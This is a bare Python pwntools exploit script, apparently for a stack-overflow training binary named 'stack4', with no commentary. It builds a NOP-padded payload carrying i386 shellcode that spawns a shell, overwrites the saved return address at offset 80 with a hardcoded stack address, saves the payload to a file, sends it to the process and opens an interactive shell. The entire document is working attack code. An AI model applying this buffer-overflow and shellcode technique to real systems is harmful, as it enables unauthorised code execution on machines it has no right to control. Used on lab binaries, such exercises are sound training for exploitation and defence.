from pwn import *

context.clear(arch="i386")
p = process('./stack4')

offset_ret = 80
core_ret = 68
nop_sled = 2000
ret_addr = 0xffffd270
buffer_addr = 0xffffd224
buffer_addr2 = 0xffffd720

crash_str = flat({offset_ret:pack(ret_addr),core_ret:pack(ret_addr)},filler=pack(0x90))
exploit_str = flat({20:asm(shellcraft.i386.sh()),offset_ret:pack(buffer_addr),core_ret:pack(buffer_addr)},filler='\x90')

exploit_file = open('exploit.in', 'w')
exploit_file.write(exploit_str)

p.sendline(exploit_str)
p.interactive()
p.corefile
